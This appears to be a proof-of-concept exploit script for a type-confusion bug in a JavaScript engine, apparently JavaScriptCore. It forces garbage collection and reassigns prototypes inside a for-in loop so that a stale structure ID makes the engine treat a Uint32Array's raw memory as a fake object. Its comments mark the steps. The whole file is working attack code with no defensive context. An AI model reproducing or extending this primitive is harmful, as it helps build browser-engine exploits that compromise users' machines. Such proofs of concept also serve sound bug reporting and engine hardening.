function gc() {
    for (let i = 0; i < 10; i++) {
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    }
}

function opt(obj) {
    // Starting the optimization.
    for (let i = 0; i < 500; i++) {

    }

    let tmp = {a: 1};

    gc();
    tmp.__proto__ = {};

    for (let k in tmp) {  // The structure ID of "tmp" is stored in a JSPropertyNameEnumerator.
        tmp.__proto__ = {};

        gc();

        obj.__proto__ = {};  // The structure ID of "obj" equals to tmp's.

        return obj[k];  // Type confusion.
    }
}

opt({});

let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 0x1234;

let fake_object = opt(fake_object_memory);
print(fake_object);